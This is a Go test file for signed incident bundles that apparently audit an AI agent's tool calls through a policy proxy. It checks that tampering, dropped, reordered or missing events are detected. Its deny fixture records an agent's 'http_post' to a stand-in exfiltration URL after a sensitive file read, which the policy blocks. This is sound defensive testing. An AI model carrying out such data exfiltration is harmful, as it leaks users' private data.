package incidentbundle

import (
	"crypto"
	"crypto/ed25519"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/themayursinha/mcp-visor/internal/signer"
)

// fixedKey is a deterministic example-only signing key for the checked-in
// fixtures. Fixtures are illustrations, never trust anchors.
type fixedKey struct {
	priv ed25519.PrivateKey
	pub  ed25519.PublicKey
	id   string
}

func exampleSeedKey(t *testing.T) *fixedKey {
	t.Helper()
	seed := make([]byte, ed25519.SeedSize)
	for i := range seed {
		seed[i] = byte(i + 1)
	}
	priv := ed25519.NewKeyFromSeed(seed)
	pub := priv.Public().(ed25519.PublicKey)
	return &fixedKey{priv: priv, pub: pub, id: fmt.Sprintf("key-%s", hex.EncodeToString(pub[:8]))}
}

func (k *fixedKey) Sign(data []byte) ([]byte, error) { return ed25519.Sign(k.priv, data), nil }
func (k *fixedKey) PublicKey() crypto.PublicKey      { return k.pub }
func (k *fixedKey) KeyID() string                    { return k.id }
func (k *fixedKey) Algorithm() string                { return "ed25519" }

func buildAllowBundle(t *testing.T, s *fixedKey) *Bundle {
	t.Helper()
	b := New("exec-allow-001", "policy-sha256:demo", 1788000000)
	mustAppend(t, b, KindRequestedAction, 1788000001, func(ev *Event) {
		ev.Principal = "agent:demo"
		ev.Delegation = []string{"user:mayur"}
		ev.AuthorityRef = "policy:demo-policy#filesystem/file_read"
		ev.Payload = map[string]any{"server": "filesystem", "tool": "file_read", "path": "/home/user/readme.md"}
		ev.RedactionNote = "no patterns matched"
		ev.EvidenceSource = "proxy-request"
	})
	mustAppend(t, b, KindPolicyDecision, 1788000002, func(ev *Event) {
		ev.Payload = map[string]any{"decision": "allow", "rule": "allow_path", "risk": "medium"}
		ev.EvidenceSource = "policy-evaluate"
	})
	mustAppend(t, b, KindRuntimeAttempt, 1788000003, func(ev *Event) {
		ev.Payload = map[string]any{"relayed": true, "transport": "stdio"}
		ev.EvidenceSource = "proxy-relay"
	})
	mustAppend(t, b, KindExternalEffect, 1788000004, func(ev *Event) {
		ev.Payload = map[string]any{"effect": "file bytes returned", "bytes": 42}
		ev.Confirmation = ConfirmationConfirmed
		ev.EvidenceSource = "server-response"
	})
	mustAppend(t, b, KindStateDelta, 1788000005, func(ev *Event) {
		ev.Payload = map[string]any{"taints_added": []string{}}
		ev.EvidenceSource = "session-state"
	})
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	return b
}

func buildDenyBundle(t *testing.T, s *fixedKey) *Bundle {
	t.Helper()
	b := New("exec-deny-003", "policy-sha256:demo", 1788000010)
	mustAppend(t, b, KindRequestedAction, 1788000011, func(ev *Event) {
		ev.Principal = "agent:demo"
		ev.Delegation = []string{"user:mayur"}
		ev.AuthorityRef = "policy:demo-policy#http_post"
		ev.Payload = map[string]any{"server": "net", "tool": "http_post", "url": "https://exfil.invalid/upload"}
		ev.RedactionNote = "no patterns matched"
		ev.EvidenceSource = "proxy-request"
	})
	mustAppend(t, b, KindPolicyDecision, 1788000012, func(ev *Event) {
		ev.Payload = map[string]any{"decision": "deny", "rule": "block_sensitive_egress", "taint": "sensitive_file_accessed"}
		ev.EvidenceSource = "policy-evaluate"
	})
	mustAppend(t, b, KindRuntimeAttempt, 1788000013, func(ev *Event) {
		ev.Payload = map[string]any{"relayed": false, "reason": "denied-before-relay"}
		ev.EvidenceSource = "proxy-relay"
	})
	mustAppend(t, b, KindExternalEffect, 1788000013, func(ev *Event) {
		// The post never reached the server: the independently confirmed
		// external effect is *absence*, recorded by the server observe-log.
		ev.Payload = map[string]any{"effect": "no egress observed", "observed_calls": []string{"file_read#100", "file_read#200"}}
		ev.Confirmation = ConfirmationConfirmed
		ev.EvidenceSource = "server-observe-log"
	})
	mustAppend(t, b, KindStateDelta, 1788000014, func(ev *Event) {
		ev.Payload = map[string]any{"taints_added": []string{"sensitive_file_accessed"}}
		ev.EvidenceSource = "session-state"
	})
	mustAppend(t, b, KindPropagation, 1788000015, func(ev *Event) {
		ev.Payload = map[string]any{"siem_forwarded": true, "receipt": "exec-deny-003"}
		ev.Confirmation = ConfirmationUnconfirmed
		ev.EvidenceSource = "siem-exporter"
	})
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	return b
}

func mustAppend(t *testing.T, b *Bundle, kind string, ts int64, build func(*Event)) {
	t.Helper()
	if err := b.Append(kind, ts, build); err != nil {
		t.Fatal(err)
	}
}

// TestWriteFixtures regenerates examples/incident-bundle/*.json. Run with
// INCIDENT_FIXTURES=write; normal runs only verify the checked-in files.
func TestWriteFixtures(t *testing.T) {
	if os.Getenv("INCIDENT_FIXTURES") != "write" {
		t.Skip("fixture generation opt-in")
	}
	s := exampleSeedKey(t)
	for name, b := range map[string]*Bundle{"allow": buildAllowBundle(t, s), "deny": buildDenyBundle(t, s)} {
		data, err := json.MarshalIndent(b, "", "  ")
		if err != nil {
			t.Fatal(err)
		}
		path := filepath.Join("..", "..", "examples", "incident-bundle", name+".json")
		if err := os.WriteFile(path, append(data, '\n'), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func loadFixture(t *testing.T, name string) *Bundle {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("..", "..", "examples", "incident-bundle", name+".json"))
	if err != nil {
		t.Fatal(err)
	}
	b, err := Unmarshal(data)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func exampleVerifier(t *testing.T, b *Bundle) *signer.ApprovalVerifier {
	t.Helper()
	raw, err := hex.DecodeString(b.Manifest.PublicKey)
	if err != nil {
		t.Fatal(err)
	}
	return signer.NewVerifierFromPublicKey(ed25519.PublicKey(raw))
}

func TestFixturesVerify(t *testing.T) {
	s := exampleSeedKey(t)
	_ = s
	for _, name := range []string{"allow", "deny"} {
		b := loadFixture(t, name)
		if err := b.Verify(exampleVerifier(t, b)); err != nil {
			t.Fatalf("%s fixture: %v", name, err)
		}
		if b.Manifest.SpecVersion != SpecVersion {
			t.Fatalf("%s fixture: spec %q", name, b.Manifest.SpecVersion)
		}
	}
}

func TestTamperPayloadDetected(t *testing.T) {
	b := loadFixture(t, "deny")
	b.Events[1].Payload["decision"] = "allow"
	if err := b.Verify(exampleVerifier(t, b)); err == nil {
		t.Fatal("mutated payload verified: tamper not detected")
	}
}

func TestDropEventDetected(t *testing.T) {
	b := loadFixture(t, "allow")
	b.Events = b.Events[:len(b.Events)-1]
	if err := b.Verify(exampleVerifier(t, b)); err == nil {
		t.Fatal("truncated bundle verified: drop not detected")
	}
}

func TestReorderDetected(t *testing.T) {
	b := loadFixture(t, "allow")
	b.Events[0], b.Events[1] = b.Events[1], b.Events[0]
	if err := b.Verify(exampleVerifier(t, b)); err == nil {
		t.Fatal("reordered bundle verified: reorder not detected")
	}
}

func TestWrongKeyDetected(t *testing.T) {
	b := loadFixture(t, "allow")
	other, err := signer.NewApprovalSigner()
	if err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(other.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("wrong-key bundle verified")
	}
}

func TestAppendAfterSealInvalidates(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildAllowBundle(t, s)
	if err := b.Append(KindPropagation, 1788000006, func(ev *Event) {
		ev.Payload = map[string]any{"note": "late"}
	}); err != nil {
		t.Fatal(err)
	}
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("post-seal append still verifies")
	}
}

func TestUnknownKindRejected(t *testing.T) {
	b := New("x", "p", 1)
	if err := b.Append("nope", 1, nil); err == nil {
		t.Fatal("unknown kind accepted")
	}
}

func TestPayloadHashMismatchRejected(t *testing.T) {
	b := New("x", "p", 1)
	err := b.Append(KindRequestedAction, 1, func(ev *Event) {
		ev.Payload = map[string]any{"a": 1}
		ev.PayloadHash = "deadbeef"
	})
	if err == nil {
		t.Fatal("mismatched payload_hash accepted")
	}
}

func TestLargeIntegersRoundTrip(t *testing.T) {
	s := exampleSeedKey(t)
	b := New("exec-bigint-001", "policy-sha256:demo", 1788000020)
	mustAppend(t, b, KindRequestedAction, 1788000021, func(ev *Event) {
		// 2^53+1: loses precision as float64; must survive marshal→parse→verify.
		ev.Payload = map[string]any{"execution_id": 9007199254740993}
		ev.EvidenceSource = "proxy-request"
	})
	mustAppend(t, b, KindPolicyDecision, 1788000022, func(ev *Event) {
		ev.Payload = map[string]any{"decision": "allow"}
	})
	mustAppend(t, b, KindRuntimeAttempt, 1788000023, func(ev *Event) {
		ev.Payload = map[string]any{"relayed": true}
	})
	mustAppend(t, b, KindExternalEffect, 1788000024, func(ev *Event) {
		ev.Payload = map[string]any{"effect": "ok"}
		ev.Confirmation = ConfirmationConfirmed
	})
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	data, err := b.Marshal()
	if err != nil {
		t.Fatal(err)
	}
	rt, err := Unmarshal(data)
	if err != nil {
		t.Fatal(err)
	}
	if err := rt.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err != nil {
		t.Fatalf("large-int bundle fails round trip: %v", err)
	}
}

func buildPartialBundle(t *testing.T, s *fixedKey, kinds ...string) *Bundle {
	t.Helper()
	b := New("exec-partial-001", "policy-sha256:demo", 1788000030)
	ts := int64(1788000031)
	for _, k := range kinds {
		mustAppend(t, b, k, ts, func(ev *Event) {
			ev.Payload = map[string]any{"note": k}
		})
		ts++
	}
	if err := b.Seal(s); err != nil {
		t.Fatal(err)
	}
	return b
}

func TestPartialEpisodeRejected(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildPartialBundle(t, s, KindRequestedAction)
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("partial episode verified")
	}
}

func TestSkippedStageRejected(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildPartialBundle(t, s, KindRequestedAction, KindExternalEffect)
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("stage-skipping episode verified")
	}
}

func TestOutOfOrderEpisodeRejected(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildPartialBundle(t, s, KindRequestedAction, KindRuntimeAttempt, KindPolicyDecision, KindExternalEffect)
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err == nil {
		t.Fatal("out-of-order episode verified")
	}
}

func TestRepeatedEffectAccepted(t *testing.T) {
	s := exampleSeedKey(t)
	b := buildPartialBundle(t, s, KindRequestedAction, KindPolicyDecision, KindRuntimeAttempt, KindExternalEffect, KindStateDelta, KindExternalEffect)
	if err := b.Verify(signer.NewVerifierFromPublicKey(s.PublicKey().(ed25519.PublicKey))); err != nil {
		t.Fatalf("confirmation-upgrade episode rejected: %v", err)
	}
}
